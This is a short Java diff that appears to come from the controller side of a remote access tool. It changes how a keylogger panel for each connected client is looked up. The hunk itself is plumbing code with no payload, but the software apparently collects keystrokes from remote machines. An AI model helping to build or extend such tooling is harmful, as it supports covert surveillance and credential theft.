@@ -15,7 +15,7 @@ public class PacketLogs extends PacketListener {
 	@Override
 	public void perform(Client client) {
 		try {
-			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.getInstances().get(client.getIP());
+			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.get(client);
 			
 			panel.getRoot().removeAllChildren();
 			
